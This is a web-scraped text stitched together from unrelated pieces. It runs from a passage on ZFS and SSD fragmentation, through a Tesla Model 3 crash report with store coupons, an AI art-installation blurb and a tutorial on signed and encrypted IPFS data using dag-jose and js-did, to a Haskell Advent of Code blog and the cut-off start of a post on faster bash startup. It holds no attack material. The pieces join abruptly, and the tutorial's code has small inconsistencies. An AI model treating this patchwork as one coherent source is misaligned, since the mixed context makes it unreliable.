<p>In the above graphic, we can see a Seagate 1TB mobile drive that I tested in CrystalDiskMark. It can do about 130 MB/s of sequential read and writes. We can also see that when we start doing random 4k I/O, the speed falls about <strong>100x</strong>. This is meant to illustrate the performance impact of data fragmentation. Additionally, we can see that the latency for these lookups can take about&nbsp;<strong>half of a second, </strong>and we are limited to about 350 IOPS. In order to be fast, virtualization workloads on traditional hard drives need to have many disks in order to compensate for this slowness. It would not be uncommon to see a pool constructed of 10 or more VDEVs of mirrored drives.</p>
<p>Additionally, there is some wisdom we can <a href="https://www.ixsystems.com/community/threads/the-path-to-success-for-block-storage.81165">borrow from the ZFS community</a>. As your pool fills up, and sequential writes become increasingly difficult to accomplish due to fragmentation, it will slow down in a non-linear way. As a general rule of thumb, at about 50% capacity your pool will be noticeably slower than it was when it was 10% capacity. At about 80%-96% capacity, your pool starts to become very slow, and ZFS will actually change its write algorithm to ensure data integrity, further slowing you down.</p>
<p>This is where SSDs come in. They radically change the game because they work very differently at the physical layer. They do not have read and write heads that are flying around a spinning disk back and forth trying to find your data. With the physical limitations of disk-based drives out of the way, SSDs can read and write non-sequential data <em>much&nbsp;</em>faster. They do not suffer the penalties of these rules nearly as severely, fragmentation does not hurt their performance to the same degree.</p>

<p>In another testament to the safety of Tesla vehicles, the driver of a <a href="https://driveteslacanada.ca/model-3">Model 3</a> was able to walk away from a crash so violent it sent the batteries flying into nearby houses.</p><p><em>Save with big discounts at your favourite Tesla accessories stores, like 10% off at Tesmanian, TesBros and Nikola Pro, plus many more.

<p>The crash occurred late yesterday, November 17 in Corvallis, Oregon. According to the Corvallis Police Department, a 2019 Model 3 (not Model S as noted in the <a href="https://www.facebook.com/CorvallisPoliceDepartment/posts/1980910832052126" target="_blank" rel="noopener nofollow noreferrer">press release</a>) was driving at approximately 100mph (160km/h) when the driver lost control of the vehicle.</p>



<p>After leaving the road and travelling more than 300 feet, the Tesla finally came to a rest after “shearing a power pole off at the base as well as striking and knocking over two trees and a telephone junction box.”</p>

<p>The accident was so violent, the Model 3 was barely recognizable with the roof sheared off, the rear end almost completely severed, and doors and even some of the battery cells missing. The force of the crash sent many of the cells into nearby homes, with one of them even landing in the lap of an occupant inside. Another landed on a bed, setting the bed sheets on fire.</p>
<p>Batteries weren’t the only thing missing from the car, as a tire came off the vehicle during the crash causing major damage to a nearby apartment building.</p><p><em>Get 10% off at <a href="https://driveteslacanada.ca/shop/tesloidcanada" target="_blank" rel="noopener">Tesloid.ca</a> or <a href="https://driveteslacanada.ca/shop/tesloidusa" target="_blank" rel="noopener">Tesloid.com</a> with coupon code DTC10 at checkout.

<p><em>“A tire was ripped from the car during the collision and struck the second story siding of a nearby apartment complex with such force that it ruptured the water pipes within the wall, destroying the bathroom to the apartment and flooding the downstairs portion of the apartment as well.”</em></p>
</blockquote>
<p>Miraculously, despite the extent of the damage to the Model 3, the driver was able to flee the scene of the accident on foot. The suspect, Dylan Milota of Corvallis, was found later with only minor injuries. According to police, Milota was impaired by marijuana, and cited for DUI – Drugs, Hit and Run, Criminal Mischief 2, Reckless Driving and Reckless Endangering.&nbsp;</p>
<p>Authorities were able to collect as many cells as they could find, but are warning nearby residents to check their properties for more. If one is found, residents are being asked to not touch the battery cells and contact the Corvallis Regional Communication Center at 541-766-6914</p>

<p><span><span><span><span><span>Selfish Machines 1.2</span></span></span></span></span></p>

<p><span><span>2019</span></span></p>

<p><span><span><span>​</span></span></span></p>

<p><span><span>Selfish Machines 1.2 explores how convolutional neural networks – machine learning systems used in image recognition and classification software – process, analyse and conceptualize our reality. The installation takes video feed from the space as an input for the neural network and visualises how such networks “see”; giving us an insight into how systems of artificial intelligence compress, dissect and transform our reality into calculable patterns. While we are confronted with the loss of representational image now being reduced to the flickering patterns of the network, the installation points out divergence in vision between humans and machines – as one representation and its meaning are lost, new meaningful representation is formed, however now only understandable to the network itself. </span></span></p>



<p><span><span>The sound element of the installation is a direct amplification of the processing of the hardware through the pickup microphone, which is placed on the computer running the neural network.</span></span></p>

<p><span><span><span>​</span></span></span></p>

<p><span><span>The code was written by Matic Potočnik. The project was commissioned by the International Festival of Computer Arts (IFCA) and co-produced by Zavod Projekt Atol.</span></span></p>

<p><span><span><span>​</span></span></span></p>

<p><span><span><span>​</span></span></span></p></div><div id="comp-k933lb3n" data-testid="richTextElement"><p><span><span>​</span></span></p>



<p><span><span>The installation is using Google’s Inception V3 convolutional neural network, which is a widely-used image recognition model trained on the ImageNet dataset. There are more than 21 million simultaneous calculations conducted instantaneously by the network when analysing the live video feed, outputting a visualisation of these calculations as a heatmap on the screen. Lighter the colour on the screen, more “excited” the network was about that specific part of the image, or more precisely, network has matched the part of the image with an already known or familiar pattern of data.</span></span></p>

<p><br>
<span><span>Convolutional neural networks are structured in layers of parameters, calculations, pattern relations, and dataset compression and processing. In this specific configuration, we have more than 300 consecutive layers, which can be understood as “depth” of the network, therefore, deeper into the network you go, more complex the network itself becomes, finding precise patterns in the slightest details of the analysed data. While we do understand how these systems work in principle, it is hard to fully explain why specific patterns are formed by the network, or further, why a network would match one specific visual pattern with another.</span></span><br>
&nbsp;</p>

<p><span><span>Instead of speculating on how such systems operate internally, Selfish Machines 1.2 attempts to visualise their internal operations as they are. If you place yourself in front of the camera, you can observe yourself first getting scaled down through data compression </span></span><span><span>into a machine trainable dataset, which is then pushed through the neural network. Focusing on the network’s ability to find patterns based on what it already know, the installation will visualise the strongest recognisable patterns (activations) on each of the network’s layers, slowly transforming you into a flickering pixelated blob, the image of yourself fully understandable only to the network itself.</span></span><br>

Rather than renounce or interpret complexities of these processes that escape our comprehension, art can be driven by them in order to expand and transform our conceptual apparatus.

                <div>
                    <p>Storing authenticated and encrypted data on <a href="https://ipfs.io/">IPFS</a> is a core building block for many Web3 applications, but to date there has not been a standardized way to encode this type of data.</p><p>Without a standard, many developers have been forced to create custom formats for their signed and encrypted data. This has been prohibitive to the openness and interoperability of information stored in IPFS by siloing data to their particular implementation. Another approach to authenticated data has been to put data in IPFS and put the CID of the data in a smart contract on a blockchain, such as <a href="https://ethereum.org/">Ethereum</a>. This is essentially an expensive way of adding a signature on top of the data and persisting the signature record on the blockchain.</p><p>With the introduction of <strong><a href="https://eips.ethereum.org/EIPS/eip-2844">EIP-2844</a>,</strong> a standard that allows wallets to support a few new methods for signing and decrypting data based on <a href="https://www.w3.org/TR/did-core/">DIDs</a> and the <strong><a href="https://github.com/ipld/specs/pull/269"><code>dag-jose</code></a></strong> IPLD codec, we can now simply put authenticated and encrypted data directly into IPFS. In this tutorial, you will learn how you can utilize these primitives with two libraries, <a href="https://github.com/ceramicnetwork/js-did"><code>js-did</code></a> and <a href="https://github.com/3box/3id-connect"><code>3ID Connect</code></a>!</p><h2 id="what-are-dids-and-jose">What are DIDs and JOSE?</h2><p><strong>DIDs</strong> is the W3C standard for <em>Decentralized Identifiers</em>. It specifies a general way of going from a string identifier, e.g. <code>did:3:bafy...</code>, to a <em>DID document</em> which contains public keys for signature verification and key exchange. In most DID methods the document can be updated when keys are rotated for security reasons.</p><p><strong>JOSE</strong> is a standard from <a href="https://www.ietf.org/standards/">IETF</a> which stands for <em>JSON Object Signing and Encryption,</em> and that pretty much explains what it is. There are two main primitives in this standard: JWS (JSON Web Signatures) and JWE (JSON Web Encryption). Both of these formats allow for multiple participants: in JWS there can be one or multiple signatures over the payload, and in JWE there might be one or multiple recipients for the encrypted cleartext.</p><h2 id="building-with-dag-jose-and-eip2844">Building with dag-jose and EIP2844</h2><p>As we have been building out <a href="https://ceramic.network/">Ceramic</a> with <strong>dag-jose</strong> and <strong>EIP-2844</strong> as basic building blocks, we've created a few lower-level tools which allow us to more easily use these technologies. This tutorial will show you how to use these powerful tools directly.</p><p><strong><a href="https://github.com/3box/identity-wallet-js/">IdentityWallet</a></strong> is an implementation of <strong>EIP-2844</strong> using 3ID as the DID method. It can be used standalone as a <em>DID Provider,</em> or more conveniently within the <strong><a href="https://github.com/3box/3id-connect/">3ID Connect</a></strong> library. 3ID Connect allows users to use their Ethereum wallet (support for more blockchains coming soon) to get access to a <em>DID Provider</em>.</p><p><strong><a href="https://github.com/ceramicnetwork/js-did">js-did</a></strong> is a library that allows developers to represent a user in the form of a DID. This is the main interface we're going to be looking at in this tutorial. It allows us to sign data with the currently authenticated user, encrypt data to any user (DID), and decrypt data with the currently authenticated user.</p><h2 id="signed-data-in-ipfs">Signed data in IPFS</h2><p>By using the <strong>dag-jose</strong> IPLD codec we can create data structures that are linked and signed. This is done by creating JSON Web Signatures (JWS) that contain a link to additional data. One of the main problems that the <strong>dag-jose</strong> codec solves is that the payload of a JWS is traditionally encoded as <code>base64url</code> which means that if it contains any IPLD links you can't traverse those links. Instead what we do with <em>DagJWS</em> is enforce the payload to be the bytes of a CID. The codec then transforms the payload into a CID instance and sets it to the <code>link</code> property of the <em>DagJWS. </em>This allows us to easily traverse the resulting DAG.</p><h2 id="setup-your-environment">Setup your environment</h2><p>This section will cover how to set up some specific dependencies needed for this tutorial. If you just want to skip the setup part we have prepared <a href="https://ceramicstudio.github.io/web-playground/">a simple playground</a> which bundles ipfs, 3id-connect, and dids. You can use it by opening the web page, clicking on connect, then opening the developer console where you can run the commands. If you decide to do so, skip the following two sections.</p><h3 id="setup-ipfs-with-dag-jose-support">Setup IPFS with dag-jose support</h3><p>Since dag-jose is a new IPLD codec it's not yet included in js-ipfs by default. It also implements the new IPLD codec API which is also not supported by js-ipfs yet. Therefore we need to do the following when we are creating an instance of IPFS:</p><pre><code>import IPFS from 'ipfs'
import dagJose from 'dag-jose'
import multiformats from 'multiformats/basics'
import legacy from 'multiformats/legacy'

multiformats.multicodec.add(dagJose)
const dagJoseFormat = legacy(multiformats, dagJose.name)

const ipfs = await Ipfs.create({ ipld: { formats: [dagJoseFormat] } })
</code></pre><h3 id="setup-did-and-3id-connect">Setup DID and 3ID Connect</h3><p>In the example setup below we use an injected Ethereum provider (such as MetaMask) to create a 3ID Connect and DID instance.</p><pre><code>import { DID } from 'dids'
import { ThreeIdConnect, EthereumAuthProvider } from '3id-connect'

// create 3id connect instance
const addresses = await window.ethereum.enable()
const authProvider = new EthereumAuthProvider(window.ethereum, addresses[0])
await threeIdConnect.connect(authProvider)

// create did instance
const didProvider = await threeIdConnect.getDidProvider()
const did = new DID({ provider: didProvider })
await did.authenticate()
window.did = did
console.log('Connected with DID:', did.id)</code></pre><h2 id="create-a-signed-data-structure">Create a signed data structure</h2><p>We can now start signing and adding data to IPFS! First lets create a simple function that takes a payload, signs it using the <code>did.createDagJWS</code> method, and adds the resulting data to IPFS. As we can see in the code below we get two objects back from this method: <code>jws</code> which is the DagJWS itself and <code>linkedBlock</code> which is the raw bytes of the encoded payload. What happens in the background is that the payload gets encoded using <strong>dag-cbor</strong>, after this the CID of the encoded payload is used as the payload of the created <code>jws</code>. We can access this payload CID on the DagJWS instance as <code>jws.link</code>.</p><pre><code>async function addSignedObject(payload) {
  // sign the payload as dag-jose
  const { jws, linkedBlock } = await did.createDagJWS(payload)
  // put the JWS into the ipfs dag
  const jwsCid = await ipfs.dag.put(jws, { format: 'dag-jose', hashAlg: 'sha2-256' })
  // put the payload into the ipfs dag
  await ipfs.block.put(linkedBlock, { cid: jws.link })
  return jwsCid
}</code></pre><p>Using this function, let's create our first signed data objects:</p><pre><code>// Create our first signed object
const cid1 = await addSignedObject({ hello: 'world' })

// Log the DagJWS:
console.log((await ipfs.dag.get(cid1)).value)
// &gt; {
// &gt;   payload: "AXESIHhRlyKdyLsRUpRdpY4jSPfiee7e0GzCynNtDoeYWLUB",
// &gt;   signatures: [{
// &gt;     signature: "h7bHmTaBGza_QlFRI9LBfgB3Nw0m7hLzwMm4nLvcR3n9sHKRoCrY0soWnDbmuG7jfVgx4rYkjJohDuMNgbTpEQ",
// &gt;     protected: "eyJraWQiOiJkaWQ6MzpiYWdjcWNlcmFza3hxeng0N2l2b2tqcW9md295dXliMjN0aWFlcGRyYXpxNXJsem4yaHg3a215YWN6d29hP3ZlcnNpb24taWQ9MCNrV01YTU1xazVXc290UW0iLCJhbGciOiJFUzI1NksifQ"
// &gt;   }],
// &gt;   link: CID(bafyreidykglsfhoixmivffc5uwhcgshx4j465xwqntbmu43nb2dzqwfvae)
// &gt; }

// Log the payload:
ipfs.dag.get(cid1, { path: '/link' }).then(b =&gt; console.log(b.value))
// &gt; { hello: 'world' }

// Create another signed object that links to the previous one
const cid2 = addSignedObject({ hello: 'getting the hang of this', prev: cid1 })

// Log the new payload:
ipfs.dag.get(cid2, { path: '/link' }).then(b =&gt; console.log(b.value))
// &gt; {
// &gt;   hello: 'getting the hang of this'
// &gt;   prev: CID(bagcqcerappi42sb4uyrjkhhakqvkiaibkl4pfnwpyt53xkmsbkns4y33ljzq)
// &gt; }

// Log the old payload:
ipfs.dag.get(cid2, { path: '/link/prev/link' }).then(b =&gt; console.log(b.value))
// &gt; { hello: 'world' }
</code></pre><p>Note that the values of the CIDs and JWS will be different for you since the payload will be signed by your DID.</p><h2 id="verify-a-signed-data-structure">Verify a signed data structure</h2><p>Verifying a JWS is very straight forward. Simply retrieve the JWS object and pass it to the <code>verifyJWS</code> method. If the signature is invalid, this function will throw an error. If the signature is valid, it will will return the DID (with key fragment) that was used to sign the JWS.</p><pre><code>const jws1 = await ipfs.dag.get(cid1)
const jws2 = await ipfs.dag.get(cid2)

const signingDID1 = await did.verifyJWS(jws1)
await did.verifyJWS(jws2)
</code></pre><h2 id="encrypted-data-in-ipfs">Encrypted data in IPFS</h2><p>Signed data in IPFS is one piece of the puzzle, but perhaps more interesting is encrypted data. With the use of <em>dag-jose</em> and <em>EIP-2844</em> we can encrypt data to one or multiple DIDs and store it directly in IPFS. Below we demonstrate how to use the convenient tools provided by the <em>js-did</em> library to do this.</p><h2 id="encrypt-ipld-data">Encrypt IPLD data</h2><p>There is a simple method to create a DagJWE object which is encrypted to one or multiple DIDs, <code>createDagJWE</code>. This method accepts an IPLD object (a JSON object that may also include CID links) and an array of DIDs. It will resolve the DIDs to retrieve the public encryption keys found in their DID document and create a JWE that is encrypted to these keys. To get going, let's create a helper function that creates a JWE and puts it into IPFS.</p><pre><code>async function addEncryptedObject(cleartext, dids) {
    const jwe = await did.createDagJWE(cleartext, dids)
    return ipfs.dag.put(jwe, { format: 'dag-jose', hashAlg: 'sha2-256' })
}
</code></pre><p>Once we have this function we can create a few encrypted objects. In the example below we first create a simple encrypted object, then we create an additional encrypted object that links to the previous one.</p><pre><code>const cid3 = await addEncryptedObject({ hello: 'secret' }, [did.id])

const cid4 = await addEncryptedObject({ hello: 'cool!', prev: cid3 }, [did.id])</code></pre><p>Note that in the example above we use <code>[did.id](&lt;http://did.id&gt;)</code> to encrypt the data to the currently authenticated DID. We can of course also encrypt the data to the DID of a user that is not locally authenticated, such as another user!</p><h2 id="decrypt-ipld-data">Decrypt IPLD data</h2><p>When the data is retrieved from IPFS we will just get the encrypted JWE. This means that we need to decrypt the data after we fetch it. Since we have created objects that link to each other, lets create a function that retrieves these objects and decrypts them recursively.</p><pre><code>async function followSecretPath(cid) {
    const jwe = (await ipfs.dag.get(cid)).value
    const cleartext = await did.decryptDagJWE(jwe)
    console.log(cleartext)
    …</code></pre></div></section></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="js-article">
    <p>I’m going to try and complete the <a href="https://adventofcode.com/">Advent of Code</a> puzzles this year, in Haskell, without bouncing off of those stupid interpreter problems that have always driven me away in the past. Encouraged by a fellow poster on <a href="https://lobste.rs/s/iaqu5l/advent_code_haskell_t_minus_16">lobste.rs</a>, I’m going to try and blog my attempt here.</p>
<p>I don’t have a lot of extra time, but I would like to be better at blogging, and also at Haskell, so let’s hope that this works out. I’m hoping to build the habits here over the next couple of weeks that will enable me to solve the puzzles in a timely fashion, and write up a description of my solution. I’ve done a bit of Haskell, largely in this Advent of Code context, so I’m not entirely a beginner, but I’m nothing like a “Haskell programmer” yet.</p>
<h2 id="getting-started">GETTING STARTED</h2>
<p>I use a Macintosh, so I’ll install <code>stack</code> via <code>homebrew</code> –</p>
<div><pre><code data-lang="shell">% brew install haskell-stack</code></pre></div>
<p>… and I’ll create a new project:
</p><div><pre><code data-lang="shell">% mkdir -p <span>$HOME</span>/Projects/AOC
% <span>cd</span> <span>$HOME</span>/Projects/AOC
% stack new AOC2020
% <span>cd</span> AOC2020
% stack build AOC2020
<span># a lot of stuff happens ....</span>
% stack <span>exec</span> AOC2020-exe
someFunc</code></pre></div>
<p>When the <code>stack new AOC2020</code> command completed, it created a directory called <code>AOC2020</code>, that has a bunch of directories with stuff in them:</p>
<div><pre><code data-lang="shell">% ls -1 */*
app/Main.hs
src/Lib.hs
test/Spec.hs
</code></pre></div><p>It sure looks like the meat is here in <code>app/Main.hs</code>:</p>
<div><pre><code data-lang="haskell"><span>module</span> <span>Main</span> <span>where</span>

<span>import</span> <span>Lib</span>

<span>main</span> <span>::</span> <span>IO</span> <span>()</span>
<span>main</span> <span>=</span> <span>someFunc</span>
</code></pre></div><p>This seems to indicate that there’s a <code>Lib</code> module we can import <code>someFunc</code> from, and in fact, if we look at <code>src/Lib.hs</code>, there we go:
</p><div><pre><code data-lang="haskell"><span>module</span> <span>Lib</span>
    <span>(</span> <span>someFunc</span>
    <span>)</span> <span>where</span>

<span>someFunc</span> <span>::</span> <span>IO</span> <span>()</span>
<span>someFunc</span> <span>=</span> <span>putStrLn</span> <span>"someFunc"</span></code></pre></div>
<h2 id="whats-the-problem">WHAT’S THE PROBLEM?</h2>
<p>In keeping with a fellow <a href="https://www.bulters.dev/posts/t-minus-16/">lobste.rs poster</a>, I’ll start with <a href="https://adventofcode.com/2019/day/1">last year’s Day 1</a>.
The description of the problem is</p>
<blockquote>
<p>[fuel] required to launch a given module is based on its mass. Specifically, to find the fuel required for a module, take its mass, divide by three, round down, and subtract 2.</p>
</blockquote>
<p>That seems like a pretty clear formula, so let’s write it in Haskell baby-talk, as a function from mass to fuel. Haskell has this equational style where you basically write the equation of the calculation you want in a very straightforward fashion (none of the ceremony of, say, Java’s <code>public static void main () {}</code> foofaraw), so the basic definition is the legal one:</p>
<div><pre><code data-lang="haskell"><span>fuel</span> <span>::</span> <span>Int</span> <span>-&gt;</span> <span>Int</span>
<span>fuel</span> <span>mass</span> <span>=</span> <span>div</span> <span>mass</span> <span>3</span> <span>-</span> <span>2</span> 
</code></pre></div><p>That looks pretty simple! <code>div</code> is integer division, and operator precedence means there are no brackets needed. The line with the <code>::</code> in it defines the type of the function – in this case, from <code>Int</code> to <code>Int</code>. Let’s write a quick test function that uses the examples given:</p>
<blockquote>
<p>For a mass of 12, divide by 3 and round down to get 4, then subtract 2 to get 2.</p>
</blockquote>
<blockquote>
<p>For a mass of 14, dividing by 3 and rounding down still yields 4, so the fuel required is also 2.</p>
</blockquote>
<blockquote>
<p>For a mass of 1969, the fuel required is 654.</p>
</blockquote>
<blockquote>
<p>For a mass of 100756, the fuel required is 33583.</p>
</blockquote>
<p>… to see if we got the logic right:</p>
<div><pre><code data-lang="haskell"><span>test</span> <span>::</span> <span>Bool</span>
<span>test</span> <span>=</span> <span>fuel</span> <span>12</span> <span>==</span> <span>2</span> <span>&amp;&amp;</span> <span>fuel</span> <span>14</span> <span>==</span> <span>2</span> <span>&amp;&amp;</span> <span>fuel</span> <span>1969</span> <span>==</span> <span>654</span> <span>&amp;&amp;</span> <span>fuel</span> <span>100756</span> <span>==</span> <span>33583</span>
</code></pre></div><p>OK, but where to put all this code?</p>
<h2 id="a-digression">A DIGRESSION</h2>
<p>I’m going to be writing all my code in Emacs – I use the <a href="https://github.com/hlissner/doom-emacs">doom</a> distribution (because life is too short to maintain my own pile of elisp), and to doom’s <code>init.el</code> I added <code>(haskell +dante)</code>. Now, I can start an “inferior-mode” interpreter and send my code over to it with <code>C-c C-l</code>.</p>
<h2 id="back-to-the-haskell">BACK TO THE HASKELL</h2>
<p>I’ve decided to start out with one module per day – obviously, this may not be the ideal way to organize everything, but eh, we’ll burn that bridge when we get there. So, let’s create a <code>lib/Day00.hs</code> module, and put our definitions in there:</p>
<div><pre><code data-lang="haskell"><span>-- | </span>

<span>module</span> <span>Day00</span> <span>where</span>

<span>test</span> <span>::</span> <span>Bool</span>
<span>test</span> <span>=</span>
  <span>fuel</span> <span>12</span> <span>==</span> <span>2</span> <span>&amp;&amp;</span>
  <span>fuel</span> <span>14</span> <span>==</span> <span>2</span> <span>&amp;&amp;</span>
  <span>fuel</span> <span>1969</span> <span>==</span> <span>654</span> <span>&amp;&amp;</span>
  <span>fuel</span> <span>100756</span> <span>==</span> <span>33583</span>

<span>-- see what we did here? We re-wrote `fuel` in "point-free" style! More on this, later</span>
<span>fuel</span> <span>::</span> <span>Int</span> <span>-&gt;</span> <span>Int</span>
<span>fuel</span> <span>=</span> <span>max</span> <span>0</span> <span>.</span> <span>subtract</span> <span>2</span> <span>.</span> <span>flip</span> <span>div</span> <span>3</span>
</code></pre></div><p>Emacs fills out the <code>module Day00</code> bit, so all I have to do is add the definitions from above. Now, I can load this source into GHCi, with <code>C-c C-l</code>, and run it:</p>
<pre><code>λ&gt; fuel 12
2
λ&gt; test
True
</code></pre><p>So far, so good! Now, let’s look at the rest of the problem definition.</p>
<blockquote>
<p>What is the sum of the fuel requirements for all of the modules on your spacecraft?</p>
</blockquote>
<p>Here, we encounter our first real problem: we have a file, with a bunch of numbers, one per line, and we need to sum the result of calling <code>fuel</code> on each of them. We’re going to have to deal with Haskell’s notorious IO system, which could mean learning all about monads and endofunctors and whatnot –  or, I could crib like a maniac from Stack Overflow and figure it out later.</p>
<p>I vote we punt. Let’s assume that we have some mechanism of reading a file, and getting the contents of that file into one big <code>String</code>. Let’s solve the problem in a pure fashion with that <code>String</code> as input, and deal with the IO stuff afterwards. Let’s break this problem down: we have a <code>String</code> and we need to turn that into a list of integer values, representing masses; compute the fuel requirement for each mass; and then sum them together. This sounds a lot like three functions:</p>
<div><pre><code data-lang="haskell"><span>stringToStrings</span> <span>::</span> <span>String</span> <span>-&gt;</span> <span>[</span><span>String</span><span>]</span>
<span>stringToMass</span> <span>::</span> <span>String</span> <span>-&gt;</span> <span>Int</span>
<span>finalFuel</span> <span>::</span> <span>[</span><span>Int</span><span>]</span> <span>-&gt;</span> <span>Int</span>
</code></pre></div><h2 id="hoogle">HOOGLE</h2>
<p>Surely we cannot be the first people who want to split a <code>String</code> into a <code>[String]</code>! Or convert a <code>String</code> into an <code>Int</code>! But how to find out what functions we have available?</p>
<p>This is where <a href="https://hoogle.haskell.org/">Hoogle</a> comes in. Hoogle is a search engine for Haskell code, and one of the things you can do with it is search by <em>type signature</em>. This is so amazingly cool: you can say, hey, we have a <code>String</code> and we need <code>[String]</code> – and, <a href="https://hoogle.haskell.org/?hoogle=String+-%3E+%5BString%5D&amp;scope=set%3Astackage">voila</a>. The very first result is <code>lines :: String -&gt; [String]</code> and the description of the function is:</p>
<blockquote>
<p>lines breaks a string up into a list of strings at newline characters. The resulting strings do not contain newlines.</p>
</blockquote>
<p>That looks pretty good to me!</p>
<p>How about <code>String -&gt; Int</code>? Hmmm. <a href="https://hoogle.haskell.org/?hoogle=String%20-%3E%20Int">Nothing here looks reasonable</a>; why is that? Well, it’s because we’re not operating at the right level of generality here. I don’t fully understand how this all is going to work, but I did some Stack Overflowing, and I figured something out. There isn’t a specific <code>String -&gt; Int</code> function; there is instead a function called <code>read</code> that can be used here, with a type coercion/specification (I don’t know the exact lingo here). This has to do with something called “type classes”, which I’m sure I’ll learn more about as we go. The invocation looks like:</p>
<div><pre><code data-lang="haskell"><span>stringToMass</span> <span>::</span> <span>String</span> <span>-&gt;</span> <span>Int</span>
<span>stringToMass</span> <span>s</span> <span>=</span> <span>read</span> <span>s</span> <span>::</span> <span>Int</span>
</code></pre></div><p>We can now start to stitch our functions together:</p>
<div><pre><code data-lang="haskell"><span>computeAnswer</span> <span>::</span> <span>String</span> <span>-&gt;</span> <span>Int</span>
<span>computeAnswer</span> <span>=</span> <span>sum</span> <span>.</span> <span>map</span> <span>(</span><span>fuel</span> <span>.</span> <span>stringToMass</span><span>)</span> <span>.</span> <span>lines</span>
</code></pre></div><p><a href="https://wiki.haskell.org/Pointfree">Point-free</a> style rears its head again, I see.</p>
<h2 id="revisiting-io">REVISITING IO</h2>
<p>So we have a function that takes a <code>String</code> representing a list of masses, one per (Unix) line, and computes the total fuel necessary for that mass. But that’s not going to be enough! We <em>also</em> need a way to read this data in from a file, and then apply our <code>computeAnswer</code> to it.</p>
<p>The first thing I’ll do is download the data to use into a location in the <code>AOC2020</code> project that makes sense:
</p><div><pre><code data-lang="shell">% mkdir -p <span>$HOME</span>/Projects/AOC/AOC2020/data
<span># copy the data from the web page ...</span>
% pbpaste &gt; <span>$HOME</span>/Projects/AOC/AOC2020/data/Day00.txt
% head <span>$HOME</span>/Projects/AOC/AOC2020/data/Day00.txt
<span>103450</span>
...</code></pre></div>
<p>Let’s try this:</p>
<div><pre><code data-lang="haskell"><span>part01</span> <span>=</span> <span>do</span>
  <span>raw</span> <span>&lt;-</span> <span>readFile</span> <span>"data/Day00.txt"</span>
  <span>putStrLn</span> <span>raw</span></code></pre></div>
<p>This now reads the contents of <code>data/Day00.txt</code> and outputs it. Not remotely interesting, but now at least we have read some data from disk and have done <em>something</em> with it.</p>
<p>When I open <code>Day00.hs</code> in my Emacs, it complains about missing top-level type annotations for <code>fuel</code>, <code>test</code>, and <code>part01</code>. You may have seen these type annotations in Haskell source:</p>
<div><pre><code data-lang="haskell"><span>isPositive</span> <span>::</span> <span>Int</span> <span>-&gt;</span> <span>Bool</span>
</code></pre></div><p>We read this as “<code>isPositive</code> is a function from an Int to a Bool”. We don’t have the definition, but we already know a lot about <code>isPositive</code>.</p>
<p>What are the type signatures for our functions defined above? Well, I can <em>ask</em> Haskell, by navigating to an expression and using <code>C-c C-t</code>  to instruct Emacs to ask Haskell for me, or by using the <code>:t</code> operator in GHCi:</p>
<pre><code>λ&gt; :t part01
part01 :: IO ()
</code></pre><p>So <code>IO ()</code> is apparently the type of the “IO Monad”. I don’t particularly care which metaphor we use to describe it; I think of this as a mechanism for the type system to keep impure code formally distinct from pure code, allowing the compiler to do more work for us; and that’s as much about it as I need right now. If I go deeper, I can see that <code>readFile</code> is of type <code>FilePath -&gt; IO String</code>, meaning that that top-level <code>IO</code> is now also part of the type of the data returned from <code>readFile</code>. But how do we operate on an <code>IO String</code>? This is where the <code>do</code> comes in, I think? We are operating in an sort of “IO context”, so in that context, I can treat an <code>IO String</code> as a <code>String</code>? Is that right? It’s right <em>enough</em> for me, for now.</p>
<p>The basic <code>String</code> type in Haskell apparently is just an alias for a list of <code>Char</code>; in other words, <code>[Char]</code>. So anywhere we see <code>String</code>, we can think <code>[Char]</code>, and vice versa. Looking at this again, we can see that <code>readFile</code> returns an <code>IO String</code>, which because of my handwaving above, we can think of as a <code>String</code> in an <code>IO</code> context, or, an <code>IO [Char]</code>. I think?</p>
<p>Let’s see what the compiler tells us!</p>
<div><pre><code data-lang="haskell"><span>part01</span> <span>::</span> <span>IO</span> <span>()</span>
<span>part01</span> <span>=</span> <span>do</span>
   <span>raw</span> <span>&lt;-</span> <span>readFile</span> <span>"data/Day00.txt"</span>
   <span>print</span> <span>(</span><span>computeAnswer</span> <span>raw</span><span>)</span>
</code></pre></div><p>It runs! It terminates! And it’s the right answer! How about that?</p>
<p>Tomorrow: part 2 of Day 1.</p>

				<p>I sped up bash startup from 165&nbsp;ms to 40&nbsp;ms. It’s actually noticeable.
Why and how did I do it?</p>

<h3 id="motivation">Motivation</h3>

<p>Whenever I need to quickly look something up (or use a calculator), I open a
new terminal (using a keyboard shortcut) and start typing into it. Slow bash
startup disrupts this workflow as I would often type before the shell prompt:</p>

<p><img src="https://work.lisk.in/img/even-faster-bash-startup/mistype.png" alt="messed up prompt"></p>

<p><a href="https://twitter.com/danpker">Daniel Parker</a> recently wrote an excellent blog post <a href="https://danpker.com/posts/2020/faster-bash-startup/">Faster Bash
Startup</a> detailing his journey from 1.7 seconds to 210&nbsp;ms. I start at 165&nbsp;ms
and need to go significantly lower than Daniel, therefore different techniques
will be needed.</p>

<h3 id="investigation">Investigation</h3>

<p><a href="https://github.com/sharkdp/hyperfine">hyperfine</a> is a brilliant command-line tool for benchmarking commands that
I discovered recently (thanks to Daniel!), so let’s see where we are now:</p>

<div><div><pre><code>[tomi@notes ~]$ hyperfine 'bash -i'
Benchmark #1: bash -i
  Time (mean ± σ):     165.8 ms ±   0.7 ms    [User: 156.3 ms, System: 12.8 ms]
  Range (min … max):   164.9 ms … 167.1 ms    17 runs
</code></pre></div></div>

<p>Now we need to find out what’s taking so long. <a href="https://stackoverflow.com/questions/5014823/how-to-profile-a-bash-shell-script-slow-startup/20855353">How to profile a bash shell
script slow startup?</a> Most Stack Overflow answers suggest some
variant of <code>set -x</code>, which will help us find any single command that takes
unusually long.</p>

<h4 id="man">man</h4>

<p>In my case, that command was <code>man -w</code>, specifically <a href="https://github.com/liskin/dotfiles/blob/7d14190467fe22bf5d4f85a7b202118d2341e3ed/.bashrc.d/10_env.sh#L8-L10">this piece of my
<code>.bashrc.d/​10_env.sh</code></a>:</p>

<div><div><pre><code><span>export </span><span>MANPATH</span><span>=</span><span>$HOME</span>/.local/share/man:
<span># FIXME: workaround for /usr/share/bash-completion/completions/man</span>
<span>MANPATH</span><span>=</span><span>$(</span>man <span>-w</span><span>)</span>
</code></pre></div></div>

<p>Turns out none of this is needed any more, <code>man</code> and <code>manpath</code> now add
<code>~/.local/​share/​man</code> automatically so I can just drop it and save more than
100&nbsp;ms<sup id="fnref:man-seccomp" role="doc-noteref"><a href="#fn:man-seccomp">1</a></sup>.</p>

<h4 id="death-by-a-thousand-cuts">death by a thousand cuts</h4>

